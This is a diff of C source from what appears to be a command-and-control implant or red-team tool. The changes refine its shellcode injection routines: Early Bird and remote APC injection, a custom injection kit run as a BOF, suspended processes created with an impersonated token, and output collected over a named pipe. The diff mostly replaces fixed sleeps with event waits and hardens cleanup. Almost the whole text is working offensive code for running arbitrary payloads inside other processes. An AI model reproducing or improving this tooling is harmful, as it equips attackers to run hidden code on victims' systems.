@@ -22,25 +22,37 @@ BOOL InjectDefault(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _Out_ PCHAR* outDat
 	HANDLE hPipe   = NULL;
 	PCHAR  output  = NULL;
 	DWORD  Length  = 0;
+	DWORD  Wait	   = 0;
 	OVERLAPPED ov  = { 0 };
+
+	*outData = NULL;
+	*outLen  = 0; 
 
     ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 
 	Status = InitNamedPipe(&ov, &hPipe);
-	if (Status == FALSE || hPipe == NULL) {
+	if ( Status == FALSE || hPipe == NULL )
+	{
 		_err("Failed to initialize named pipe. ERROR : %d", GetLastError());
 		return FALSE;
 	}
 
 	/* Inject */
-	if (!InjectProcessViaEarlyBird(buffer, bufferLen)) {
+	if ( !InjectProcessViaEarlyBird(buffer, bufferLen) ) 
+	{
 		return FALSE;
 	}
 
-	Sleep(3000);
+	Wait = WaitForSingleObject(ov.hEvent, 10000); 		// 10s
+	if ( Wait != WAIT_OBJECT_0 )
+	{
+		_err("[-] Timeout or wait failed: %d\n", GetLastError());
+		goto END;
+	}
 
 	/* Read any stdin/stderr from injected process */
-	if (!ReadNamedPipe(hPipe, &output, &Length)) {
+	if ( !ReadNamedPipe(hPipe, &output, &Length) )
+	{
 		_err("[-] No output or read failed\n");
 		goto END;
 	}
@@ -75,12 +87,14 @@ BOOL InjectCustomKit(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _In_ PCHAR Inject
 	HANDLE hPipe   = NULL;
 	PCHAR  output  = NULL;
 	DWORD  Length  = 0;
+	DWORD  Wait	   = 0;
 	OVERLAPPED ov  = { 0 };
 
     ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 
 	Status = InitNamedPipe(&ov, &hPipe);
-	if (Status == FALSE || hPipe == NULL) {
+	if ( Status == FALSE || hPipe == NULL ) 
+	{
 		_err("Failed to initialize named pipe. ERROR : %d", GetLastError())
 		return Status;
 	}
@@ -89,16 +103,17 @@ BOOL InjectCustomKit(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _In_ PCHAR Inject
 	BOOL ignoreToken = FALSE;
     PPackage temp = PackageInit(NULL, FALSE);
     PackageAddShort(temp, (USHORT)ignoreToken);                         // +2 bytes
-    PackageAddInt32(temp, bufferLen);                           		//  +4 bytes little-endian
-    PackageAddBytes(temp, buffer, bufferLen, FALSE);     				//  +sizeof(shellcode) bytes
-    PPackage arguments = PackageInit(NULL, FALSE);                        // Length-prefix the whole package
+    PackageAddInt32(temp, bufferLen);                           		// +4 bytes little-endian
+    PackageAddBytes(temp, buffer, bufferLen, FALSE);					// +sizeof(shellcode) bytes
+    PPackage arguments = PackageInit(NULL, FALSE);                      // Length-prefix the whole package
     PackageAddBytes(arguments, temp->buffer, temp->length, TRUE);
 
 	PackageDestroy(temp);
 
     /* Inject PIC with Custom Process Injection Kit BOF */
     DWORD filesize = kitLen;
-    if (!RunCOFF(InjectKit, &filesize, "gox64", arguments->buffer, arguments->length)) {
+    if ( !RunCOFF(InjectKit, &filesize, "gox64", arguments->buffer, arguments->length) )
+	{
 		_err("Failed to execute BOF in current thread.");
 		goto END;
 	}
@@ -112,12 +127,17 @@ BOOL InjectCustomKit(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _In_ PCHAR Inject
         goto END;
 	}
 
-	
-    Sleep(3000);        // TODO figure out better way to wait for output from named pipe
 
+	Wait = WaitForSingleObject(ov.hEvent, 10000); 		// 10s
+	if ( Wait != WAIT_OBJECT_0 )
+	{
+		_err("[-] Timeout or wait failed: %d\n", GetLastError());
+		goto END;
+	}
  
 	/* Read any stdin/stderr from injected process */
-	if (!ReadNamedPipe(hPipe, &output, &Length)) {
+	if ( !ReadNamedPipe(hPipe, &output, &Length) )
+	{
 		_err("[-] No output or read failed\n");
 		goto END;
 	}
@@ -146,11 +166,10 @@ BOOL InjectCustomKit(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _In_ PCHAR Inject
 
 END:
 	// Cleanup
-	free(BofOutBuf);
+	if (BofOutBuf) free(BofOutBuf);
 	PackageDestroy(arguments);
-    CloseHandle(hPipe);
-    CloseHandle(ov.hEvent);
-
+    if (hPipe) CloseHandle(hPipe);
+    if (ov.hEvent) CloseHandle(ov.hEvent);
 
 	return Status;
 }
@@ -179,15 +198,18 @@ BOOL InitNamedPipe(_Inout_ OVERLAPPED* ov, _Out_ HANDLE* pOutHandle)
         NULL            // security attributes
     );
 
-    if (hPipe == INVALID_HANDLE_VALUE) {
+    if ( hPipe == INVALID_HANDLE_VALUE ) 
+	{
         _err("[-] Failed to create named pipe: %lu\n", GetLastError());
         return FALSE;
     }
 
     _dbg("[*] Waiting for connection back to the pipe...\n");
-    if (!ConnectNamedPipe(hPipe, ov)) {
+    if ( !ConnectNamedPipe(hPipe, ov) )
+	{
         DWORD err = GetLastError();
-        if (err != ERROR_IO_PENDING && err != ERROR_PIPE_CONNECTED) {
+        if ( err != ERROR_IO_PENDING && err != ERROR_PIPE_CONNECTED )
+		{
             _err("[-] ConnectNamedPipe failed: %lu\n", err);
             CloseHandle(hPipe);
         }
@@ -218,11 +240,15 @@ BOOL ReadNamedPipe(_In_ HANDLE hPipe, _Out_ PCHAR* outBuffer, _Out_ DWORD* outSi
 
     while (TRUE) {
         BOOL ok = ReadFile(hPipe, temp, sizeof(temp), &bytesRead, NULL);
-        if (!ok || bytesRead == 0) {
+        if ( !ok || bytesRead == 0 )
+		{
             DWORD error = GetLastError();
-            if (error == ERROR_BROKEN_PIPE || error == ERROR_NO_DATA || bytesRead == 0) {
+            if ( error == ERROR_BROKEN_PIPE || error == ERROR_NO_DATA || bytesRead == 0 )
+			{
 				break;  // No more data
-            } else {
+            } 
+			else 
+			{
                 _err("[-] ReadFile failed: %lu\n", error);
                 free(buffer);
                 return FALSE;
@@ -285,7 +311,6 @@ BOOL RunViaRemoteApcInjection(IN HANDLE hThread, IN HANDLE hProc, IN PBYTE pPayl
 
 BOOL CreateTemporaryProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread)
 {
-
 	CHAR lpPath   [MAX_PATH * 2];
 	WCHAR lpPathW [MAX_PATH * 2];
 	CHAR WnDr     [MAX_PATH];
@@ -328,7 +353,7 @@ BOOL CreateTemporaryProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hP
 		
 		processCreated = CreateProcessWithTokenW(
 			gIdentityToken,   // Token handle
-			0,                // Logon flags
+			0,                // Logon flags 			TODO: LOGON_NETCREDENTIALS_ONLY?
 			NULL,             // Application name
 			lpPathW,          // Command line (wide char)
 			CREATE_SUSPENDED | CREATE_NO_WINDOW, // Creation flags
